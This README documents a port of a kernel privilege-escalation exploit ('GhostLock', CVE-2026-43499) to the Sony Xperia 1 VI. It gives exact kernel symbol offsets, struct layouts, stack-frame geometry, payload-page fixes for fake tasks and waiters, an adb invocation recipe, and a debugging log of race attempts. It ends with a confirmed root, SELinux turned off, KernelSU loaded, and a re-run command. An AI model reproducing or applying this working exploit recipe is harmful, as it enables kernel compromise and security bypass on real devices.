# Xperia 1 VI (XQ-EC72) — GhostLock CVE-2026-43499 port

Sony Xperia 1 VI (SOG13, SM8650), bootloader **locked**, kernel
`6.1.162-android14-11-g40b1a8089d75-ab14960999` (Clang 17.0.2 +pgo+bolt+lto).

This README pins every kernel constant we have **proven on-device or by
disassembly/BTF of this exact kernel** so nothing has to be re-derived.

---

## Device / boot facts (verified on-device `adb shell`)

| Fact | Value |
|---|---|
| SoC | SM8650 (Snapdragon 8 Gen 3) |
| CPUs | 8 (cpu0..cpu7) |
| RAM | ~11 GB usable |
| VA_BITS | 39 |
| MTE | none (untagged kernel pointers) |
| Seccomp | none (kernel Seccomp:0) |
| SELinux | Enforcing |
| Panic reboot behavior | clean reboot ≈40–60 s; `sys.boot.reason=kernel_panic,null` |
| Kernel image spans (VA) | `0xffffffc008000000` .. +0x2500000-ish |

## Memory / KASLR constants (verified)

```
KIMAGE_TEXT_BASE   = 0xffffffc008000000   (_text; kernel_panic tail prints "Offset: 0x... from 0xffffffc008000000" → base is exactly that)
PHYS_OFFSET        = 0x80000000           (printed by kernel_panic tail)
kernel_phys_load   = 0xa8000000           (KPHYS=0xa8000000; phys_offset=0x80000000 → delta=0x28000000 confirmed by exploit's own checks)
physmap alias base = 0xffffff8000000000 + PHYS_OFFSET = 0xffffff8800000000
```

Kernelsnitch mm leaks return addresses in `0xffffff88xxxxxxxx` → consistent
with the physmap alias base above (e.g. `0xffffff8961295000` ⇒ phys
`0x61295000` ≈ 9.5 GB region ✓).

## Syscall frame geometry (capstone disasm of `analysis/vmlinux`, exact)

futex chain (the *waiter* side):

```
__arm64_sys_futex        frame 0x70
 → do_futex              frame 0x60   (NOT PGO-inlined; direct BL)
 → futex_wait_requeue_pi frame 0x1b0
    waiter (struct rt_mutex_waiter) @ body_sp + 0x98
```

⇒ **waiter = syscall entry − (0x70+0x60+0x1b0) + 0x98 = entry − 0x1E0**

pselect chain (the *fd overlay* side):

```
__arm64_sys_pselect6     frame 0x90   (do_pselect fully inlined into it)
 → core_sys_select       frame 0x1c0  (direct BL at 0x3bb120)
    stack_fds            @ body_sp + 0x50   (kvfree guard `cmp x23, sp+0x50`)
```

⇒ **buffer = entry − 0x200**

**⇒ waiter − buffer = +0x20 ⇒ fd word w lands at `waiter + 8w − 0x20`.**

`PSELECT_SHIFT = +4` closes the fdset compact table on this geometry
(shown with the vivo comparison below).

## Struct layouts (extracted from this kernel's BTF, exact)

`rt_mutex_waiter` (size 0x58):

| field | offset |
|---|---|
| tree_entry (pc/right/left) | 0x00 / 0x08 / 0x10 |
| pi_tree_entry (pc/right/left) | 0x18 / 0x20 / 0x28 |
| task | 0x30 |
| lock | 0x38 |
| wake_state | 0x40 |
| prio | 0x44 |
| deadline | 0x48 |
| ww_ctx | 0x50 |

⇒ **real-waiter field → fd word (at shift 4):** tree_left→6, pi_pc→7,
pi_right→8, pi_left→9, **task→10, lock→11**, wake(int)→12, deadline→13.
This is exactly `words_compact` + shift 4. ✓

vivo T4 comparison (validates the table): the compact table assumes
*waiter = buffer* at shift 0 (vivo's geometry), and both kernels share the
6.1 struct layout ⇒ Sony needs +0x20 = **shift +4**.

`task_struct` (size 0x12C0) — the ones that matter for the payload page:

| field | offset |
|---|---|
| usage | 0x40 |
| state (__state) | 0x30 |
| on_cpu | 0x4C |
| wake_cpu | 0x7C |
| on_rq | 0x80 |
| prio | 0x84 |
| normal_prio | 0x8C |
| rt_priority | 0x90 |
| sched_task_group | 0x348 |
| pi_lock | 0x924 |
| pi_waiters | 0x938 |
| pi_top_task | 0x948 |
| pi_blocked_on | 0x950 |
| pid / tgid | 0x630 / 0x634 |
| real_parent | 0x640 |
| atomic_flags | 0x5F0 |
| real_cred / cred | 0x830 / 0x838 |
| comm | 0x848 |
| tasks | 0x550 |
| seccomp | 0x900 |
| cpus_ptr | 0x490 |
| cpus_mask | 0x4A0 |

`mm_struct.owner = 0x2A0` (mm leak confirms: `mm_struct=0xffffff89…`).

`file_operations` on this kernel — decoded empirically from the real
`ashmem_fops` object at image offset `0x01281910` (6.1 has **no** fop_flags):

| slot | offset |
|---|---|
| llseek | 0x08 |
| read_iter | 0x20 |
| write_iter | 0x28 |
| ioctl | 0x50 |
| compat_ioctl | 0x58 |
| mmap | 0x60 |
| open | 0x70 |
| release | 0x80 |
| splice_read | 0xC8 |
| show_fdinfo | 0xE0 |

## Device entry offsets (`src/devices/xperia1vi/offsets.h` — proven)

```
kernel_phys_load      0xa8000000    kimage_text_base 0xffffffc008000000
off_init_task         0x0201F440    off_selinux_enforcing  0x0225A448
off_init_cred         0x020318E8    off_kptr_restrict      0x0201CE78
off_init_uts_ns       0x021A2DB0    off_extract_btf        (see tool output for full set)
off_root_task_group   0x02208580    off_ashmem_misc_fops   0x0217CC70
off_empty_zero_page   0x02201000    off_ashmem_fops        0x01281910
off_ashmem_ioctl      0x00C3CDF0    off_configfs_read_iter      0x00464F44
off_ashmem_compat     0x00C3D728    off_configfs_bin_write_iter 0x00465150
off_ashmem_mmap       0x00C3D780    off_noop_llseek-alternative 0x00398E88 (upstream uses off_noop_llseek; entry name differs)
off_ashmem_open       0x00C3D9A0    off_system_unbound_wq       0x0200AC60
off_ashmem_release    0x00C3DA28    off_call_usermodehelper_exec_work 0x000D37F4
off_ashmem_show_fdinfo 0x00C3DB48   off_copy_splice_read = 0 (slot absent)
off_cap_capable_active = 0
```

Same values are baked into `target.h` statics and mirrored by
`runtime_struct_offsets.h` entry-driven overrides (per-TU fix — the
previous single-file override left `fops.c/root.c/slide.c/umh_root.c`
using broken defaults).

## Payload-page fixes shipped (this repo)

* Fake task sanitizer (env `PSELECT_FAKE_STATE_FIX`, default on): writes
  `state=0, on_cpu=0, on_rq=0, wake_cpu=0, cpus_mask=0xff,
  cpus_ptr=&mask-in-page` — counters "0x41414141 keeps
  `spin_on_owner` alive" (logged as implemented; not yet the full fix).
* Compact (6.1) W0 layout: the mode-4 write primitive's pi_tree entry is
  now written at **0x18/0x20/0x28** (was at the 6.12 slots 0x28/0x30/0x38,
  where `task@0x30`/`lock@0x38` clobbered it). `fake_task.pi_waiters`
  root points to `W0+0x18`.
* `refresh_fake_fops_text` skips stopped (zero) slots (device entry has
  `off_copy_splice_read = 0`).

## On-device invocation (proven recipe)

```
adb shell 'KPHYS=0xa8000000 PSELECT_SHIFT=4 [PSELECT_ROUTE_DELAY_USEC=N] \
           timeout 150 /data/local/tmp/ghostlock'
```

* md5 of the current binary: see git — the last tested build was built from
  `src/core` here; ALWAYS verify `adb shell md5sum /data/local/tmp/ghostlock`
  after every panic reboot (stale binary reverts were observed twice).

## Attempt log — what worked and what failed

### What works (reproduced)

| Item | Evidence |
|---|---|
| Offset match / p0 profile / KernelSnitch mm leak / heap spray | works on device and in VM (leak flaky but succeeds within retries) |
| **The pselect race itself** | **fully works in the QEMU lab with the byte-identical Sony Image**: `pselect returned ret=0 success=1` → cfi probe captured fake fops (`ioctl=ffffffc008c3cdf0` = real `ashmem_ioctl`) → `fops redirect done`. No freeze, no crash. The exploit logic is **not** the blocker. |
| Race under CPU contention | VM with 8 busy-loop burners saturating all 8 vCPUs: race still succeeded (`post-select +769ms ret=0`, `success=1`). Scheduling pressure does **not** cause the livelock. |
| Historic device success ("run B") | old binary, shift=0: `PI route done` reached exactly once on real hardware. |

### What failed on device (~30 boots)

| Attempt | Result |
|---|---|
| Delay sweep `PSELECT_ROUTE_DELAY_USEC` 0 / 9 / 20 / 30 / 50 / 70 / 150 ms | all fail (0 survives but no effect; others panic/freeze) |
| Shift sweep −5..4 | all fail (pre-loop runs) |
| Zero-fill payload page (`memset 0x41` → `0x00`, util.c:703) | still froze ⇒ livelock is **not** garbage-field poisoning of the fake frame |
| Fake-task sanitizer (`PSELECT_FAKE_STATE_FIX`: state/on_cpu/on_rq/wake_cpu/cpus_mask/cpus_ptr) | no change |
| Compact 6.1 W0 pi-entry relocation (0x18/0x20/0x28) | no change |
| Somalia pacing (one race attempt per process, outer re-fork, no cross-thread watchdog) | adopted in VM lab; device-side pristine binary still fails (below) |

### Pristine-tree device build → first diagnosable crash (2026-10-26)

Built from the **untouched anchor repo** (`ghostlock-anchor/ghostlock-oneplus`
@ `017d0f9`, only `xperia1iv` + `xperia1vi` offsets added; the include must sit
**above** the `{ .uname_r = NULL }` table terminator or the entry is silently
dropped — first build failed with `no offsets for kernel`).

Instead of the usual silent freeze, the device **panicked**:

```
Unable to handle kernel NULL pointer dereference at virtual address 0x25
Code: d5384109 b9401128 11000508 b9001128 (b9400008)   ← ldr w8,[x0], x0=0x25
```

Symbolized via vmlinux + kallsyms (see ELF mapping note below):

```
_raw_spin_trylock+0x1c  =  ldr w8, [x0]      (raw_spin_trylock(&waiter->lock))
```

This is **walk check [5] of `rt_mutex_adjust_prio_chain`** with
`waiter->lock == 0x25`. `0x25` is not a kernel pointer — it is a **select
output-bitmap word** (bits 0, 2, 5 set). ⇒ **On-device, the fd-overlay
geometry lands the fake waiter in the pselect out/bits region instead of the
fd-pointer array.** The device pselect frame offset differs from the VM's
(VM uses shift 0 and walks a correctly-placed waiter; the device does not).
The earlier silent freezes are the same walk bug at other alignments, where
the overlay's words happen to look like valid pointers and the walk soft-locks
instead of faulting.

### Authoring bisect (devloop3, 2026-10-26 evening)

Binary `94dec8f6` (leftmost=0 fix + `W0_TOPO` env knob), all runs at the
confirmed geometry (shift=3, `ex0 = fake_lock` proves the lock-slot mapping):

| run | topology | result |
|---|---|---|
| control | current (crashing) | trylock `0x25` |
| A | red node, no child — erase is a no-op | trylock `0x25` |
| **B** | **pc=0, child in-page — zero kernel-side exposure** | **`0x339` walk-internal crash** |
| C | two in-page children | trylock `0x25` |

**B exonerates the erase**: with no write, no bogus parent, no rb_next and no
fixup, the walk still hit `x27=0x301` → `[x27+0x38]`. The fatal waiter pointer
enters the walk independently of the erase topology. The trylock `0x25` runs are
reclaim-miss variance (stale frame consumed instead of the overlay) — single
runs per config are confounded by the ~50/50 race, so B's `0x339` is the
load-bearing data point.

Open question: where the walk picks up `waiter = 0x301` (= `W0_OFF(0x300)|1`,
a red-tagged parent whose parent value is the raw page *offset* 0x300).
Candidates: a second walk re-entering over corrupted state, `task->pi_blocked_on`
of some task, or the wake path. Ground truth in progress: gdbstub trace of the
walk in the VM (`/tmp/opencode/lab/gdbtrace.txt`, breakpoints at walk entry,
`0x…91921c` block start and the `0x…919244` faulting instruction).

### Forensics notes (proven this session)

* ELF mapping for `analysis/vmlinux`: **VA = 0xffffffc008000000 +
  (file_offset − 0x1c0)** (from the program header). Naive
  `VA = base + file_offset` mis-symbolizes by +0x1c0.
* KASLR is **ON** on device: panic tail printed `Kernel Offset: 0x133a400000
  from 0xffffffc008000000` (the static `KIMAGE_TEXT_BASE` + baked offsets
  still work because the leak-driven constants are slide-relative).
* Panic cmdline tail: `kpti=0`, `slub_debug=-`, `kernel.panic_on_rcu_stall=1`,
  `PREEMPT SMP`, `PHYS_OFFSET: 0x80000000`.
* Qualcomm ramoops omits the oops backtrace/registers — recover the faulting
  PC from the `Code:` instruction window (byte-search vmlinux).

## QEMU lab (VM) — `/tmp/opencode/lab/`

Boots the byte-identical Sony Image under `qemu-system-aarch64 -M virt -cpu
max -smp 8 -m 2048` (`run_qemu.sh`, `initramfs.cpio.gz`, static-bionic
`init` + static exploit `e`):

* VM ashmem misc minor **121**; `KPHYS=40200000` (QEMU loads at RAM+2 MiB);
  `P0PHYS=40000000` — delivered to the exploit via init's `setenv` + `execve`.
* `FORCE_FOPS_ROUTE=1` branch in `main.c` (VM has no selinuxfs →
  `check_selinux_off()` returns 1 and mode-4 was skipped; the flag forces it).
* `init` implements the Somalia pacing: one race attempt per process, outer
  re-fork loop, 5 passes, 2 s task monitor.
* Stress knob: kernel cmdline `burners=N` spawns N CPU-hog children in init.
* Loop harness for device runs: `/tmp/opencode/devloop/run.sh` (reboot → push
  → run with `PSELECT_SHIFT` → collect `console-ramoops-0` → summary log).

## Reference port (somalia)

`tusharpandey13/ghostlock-somalia` (blog:
tusharpandey.com/blogs/ghostlock-somalia): confirmed same-stack fd_set copy
reclaim (NFDS=320 → 256-byte copy); a lost race looks like `captured=0`,
**not** a kernel freeze; one pselect attempt per process + outer re-fork;
QEMU lab validates leak/route/fops on the vendor Image.

## Next known-good lever

The panic proves the walk is consuming an **incorrectly placed** fake waiter
on device: `waiter->lock` holds a select bitmap word, not an rtmutex pointer.
The fix is frame geometry, not payload sanitation:

1. Map the device-vs-VM frame delta: shift sweep already running in the
   background loop (`PSELECT_SHIFT` = 1, 0, 2, 4, −2, 6 — each run's
   `console-ramoops-0` shows whether/how the fault address moves off 0x25).
2. Re-derive the device pselect frame with the panic data: the bitmap-word
   position inside `stack_fds` is a ruler for how many words off the overlay
   base is.
3. Once geometry matches the VM's (race proven there), the device should
   behave like the VM: success or clean `captured=0` miss, never a freeze.

## 2026-10-27 ~02:40 — ROOT ACHIEVED ✅ (Set 2, select_stack, v4 profile)
- Root cause of all W1 failures: hand-transcribed profile had selinux_enforcing +0x1000 (0x225B448; true 0x225A448) and the Zenfone's selinux_blob_sizes. Fix: profile generated 100% from `ghostlock-extract --format json` (xperia_extracted.json → xperia_profile_v4.bin).
- Run: W1 SELinux off → W2 child uid=0 → ksud 4.2.0-rc3 late-load (kmi=android14-6.1) exit=0 → kernelsu.ko loaded → `su -c id` = uid=0 context=u:r:ksu:s0. SELinux restored to Enforcing by ksud fixup.
- Persistence: per-boot only (locked bootloader). Re-run per boot: `ghostlock_native --load-prebuilt-profile /data/local/tmp/xperia_profile_v4.bin --force-attack` (~50% landing rate).
- Dead ends: tcp_zerocopy route panics on this device (garbage page_base, page+0xe80 trylock); mm_struct_sz must stay 1024 (960 = true struct size only; 960 breaks the KernelSnitch leak).
